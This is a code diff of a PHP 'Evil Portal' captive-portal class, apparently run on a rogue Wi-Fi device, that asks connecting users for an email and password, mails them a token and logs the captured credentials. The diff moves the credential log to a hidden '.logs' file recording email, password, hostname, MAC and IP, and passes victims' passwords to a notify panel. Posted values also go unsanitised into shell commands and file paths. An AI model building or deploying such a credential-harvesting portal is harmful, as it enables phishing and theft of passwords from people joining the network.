@@ -5,65 +5,50 @@ class MyPortal extends Portal
     public function handleAuthorization()
     {
     	  function generateRandomString($length = 8) {
-    		return substr(str_shuffle(str_repeat($x='23456789abcdefghkmnpqrstuvwxyzABCDEFGHKMNPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
-		  }
-		  
-    	  $dirs = array(
-            '/root/', 
-            '/sd/',
-        );
-        $dirs = array_filter($dirs, 'file_exists');
-        $dirs = array_filter($dirs, 'is_writeable');
-        if (empty($dirs)) {
-            die("die");
-        }
-        $dir = array_pop($dirs);
-        $want = $dir . DIRECTORY_SEPARATOR . 'evilportal-logs';
-        if (file_exists($want)) {
-        } 
-        else {
-            mkdir($want);
-        }
-        if (!file_exists($want)) {
-        }
-        if (!is_dir($want)) {
-        }
-        if (!is_writeable($want)) {
-        }
-        $want .= DIRECTORY_SEPARATOR;
+    	   return substr(str_shuffle(str_repeat($x='23456789abcdefghkmnpqrstuvwxyzABCDEFGHKMNPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+	  }
+	    
     	  $token = generateRandomString(8); //token
-    	  
-		  $sub = "Evil Portal Your WIFI-Token !\nContent-Type: text/html"; //Subject of the mail & html format info
-		  $sender = "info@test.de"; //Sender of the mail
+    	
+	  $sub = "Evil Portal Your WIFI-Token !\nContent-Type: text/html"; //Subject of the mail & html format info
+	  $sender = "info@test.de"; //Sender of the mail
 		  
-		  $body = file_get_contents("/www/template.html"); //read the template 
-		  $mailtext = str_replace('TOKEN', $token, $body); //insert token (TOKEN will be replaced)
-		  if (isset($_POST['gettoken'])) {
-		   $email = isset($_POST['email']) ? $_POST['email'] : 'email';
-		   $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
-		   $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
-		   $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
-		   $gpw = isset($_POST['gpw']) ? $_POST['gpw'] : 'gpw';
-		   $this->execBackground("notify $email' Requested Token:'$token' - PW:'$gpw' - IP:'$ip"); //notify panel 
-		   $this->sendmail($sub, $mailtext, $sender, $email); //Send the mail
-		   file_put_contents("$dir/evilportal-logs/$mac:mail.txt", "{$email}/n", FILE_APPEND); // write mail file
-         file_put_contents("$dir/evilportal-logs/portal-logins.txt", "{$email}:{$gpw}/n", FILE_APPEND); // write google clients file 
-         file_put_contents("$dir/evilportal-logs/$mac.txt", "{$token}", FILE_APPEND); // write auth file 
-         die();
-		  }
-		  if (isset($_POST['getaccess'])) {
-         $rtoken = isset($_POST['token']) ? $_POST['token'] : 'token';
-         $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
-         $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
-         $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
-         $dtoken = file_get_contents("$dir/evilportal-logs/$mac.txt"); //read auth file
-         if($rtoken == $dtoken) {       
-            $this->execBackground("notify $mac' Login:'$rtoken' IP:'$ip"); //notify panel 
-            $this->execBackground("writeLog $mac' - '$rtoken");
-            parent::handleAuthorization();
-            unlink("$dir/evilportal-logs/$mac:mail.txt");
-            unlink("$dir/evilportal-logs/$mac.txt");
-         }
+	  $body = file_get_contents("/www/template.html"); //read the template 
+	  $mailtext = str_replace('TOKEN', $token, $body); //insert token (TOKEN will be replaced)
+	  if (isset($_POST['gettoken'])) {
+	   
+	     $email = isset($_POST['email']) ? $_POST['email'] : 'email';
+	     $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
+	     $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
+	     $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
+	     $gpw = isset($_POST['gpw']) ? $_POST['gpw'] : 'gpw';
+	     $this->execBackground("notify $email' Requested Token:'$token' - PW:'$gpw' - IP:'$ip"); //notify panel 
+             $this->sendmail($sub, $mailtext, $sender, $email); //Send the mail
+		
+	     $reflector = new \ReflectionClass(get_class($this));
+             $logPath = dirname($reflector->getFileName());	   
+	     file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$gpw}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+		  
+  	     file_put_contents("{$logPath}/$mac:mail.txt", "{$email}/n", FILE_APPEND); // write mail file
+             file_put_contents("{$logPath}/$mac.txt", "{$token}", FILE_APPEND); // write auth file 
+             die();
+	  }
+	    
+         if (isset($_POST['getaccess'])) {
+		 
+            $rtoken = isset($_POST['token']) ? $_POST['token'] : 'token';
+            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
+            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
+            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
+	    $reflector = new \ReflectionClass(get_class($this));
+            $logPath = dirname($reflector->getFileName());
+            $dtoken = file_get_contents("{$logPath}/$mac.txt"); //read auth file
+            if($rtoken == $dtoken) {       
+            	$this->execBackground("notify $mac' Login:'$rtoken' IP:'$ip"); //notify panel 
+            	parent::handleAuthorization();
+            	unlink("{$logPath}/$mac:mail.txt");
+            	unlink("{$logPath}/$mac.txt");
+            }
      	 }
 	        // Call parent to handle basic authorization first
 	        //parent::handleAuthorization();
